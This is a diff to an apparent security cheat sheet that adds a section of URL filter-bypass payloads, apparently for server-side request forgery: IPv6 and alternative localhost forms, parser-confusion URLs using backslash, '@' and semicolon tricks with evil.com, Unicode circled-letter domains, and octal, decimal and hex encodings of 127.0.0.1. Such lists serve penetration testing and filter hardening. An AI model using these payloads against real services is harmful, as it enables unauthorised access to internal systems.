@@ -118,7 +118,52 @@ a list of Unicode circles equivalent characters and numbers:
 ⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇
 ⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛
 ⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵
-Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ
+Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ
+ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ
+```
+
+
+## Bypass URL block list
+
+### IPv6
+
+```
+http://[::]:80
+http://0000::1:80/
+http://::1/
+```
+
+### Localhost representation
+
+```
+http://0/
+http://127.1/
+http://0.0.0.0/
+http://127.127.127.127/
+```
+
+### URL parser logic
+
+```
+http://evil$google.com
+http://127.1.1.1\@127.2.2.2:80/
+http://127.1.1.1\@@127.2.2.2:80/
+0://evil.com:80;http://google.com:80/
+```
+
+### Unicode normalization
+
+```
+http://ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ
+```
+
+### Address encoding
+
+```
+Octal: http://0177.0.0.01
+Decimal: http://2130706433/
+Hex: http://0x7f.0x0.0x0.0x1
+Mixed: http://0177.0x0.0x0.1
 ```
 
 
